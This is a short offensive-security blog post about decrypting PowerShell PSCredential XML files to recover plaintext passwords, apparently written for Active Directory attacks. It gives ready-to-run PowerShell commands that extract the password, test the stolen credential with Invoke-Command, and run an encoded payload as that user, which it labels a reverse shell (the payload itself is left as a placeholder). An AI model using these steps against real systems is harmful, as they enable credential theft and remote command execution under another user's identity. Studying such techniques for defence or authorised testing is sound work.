---
title: "Decode the Binary passwords"
date: 2025-11-04 00:00:00 +0800
categories: [AD- Attacks]
tags: [Decode the Binary passwords]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/decode.png
excerpt: "Technical understanding and practical overview"
---

# Decode the Binary passwords (`.xml`)
> PSCredential XML Decryption is the process of extracting and converting securely stored credentials from serialized PowerShell objects in XML format back to plaintext authentication tokens.
```bash
If the file contain the binary password, like this :- 0101919310841001837146106741741069169491893010101100101001010010010110100101016471551646101808181838
```
# You can Decrypt it using the Powershell Manuall and Automate Ways:-

# (1) Manuall Way
Make sure you paste the write Encoded password and username.
```bash
$pwd = ConvertTo-SecureString  <encoded password>
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "user_name",$pwd    # Grap the username from the xml file.
$cred.GetNetworkCredential().password
```
# (2) Manuall Way
```bash
$secureString = ConvertTo-SecureString "<encrypted_binary>"
$credential = New-Object PSCredential("username", $secureString)
$plainTextPassword = $credential.GetNetworkCredential().Password
```
# > Automate Way
```bash
(Import-Clixml "C:\Path\To\Your\file.xml").GetNetworkCredential().Password
```
# > Verify it
```bash
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 2>&1
```
# > Reverse shell as that user
```bash
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { powershell -enc <encoded code here> } 2>&1
```
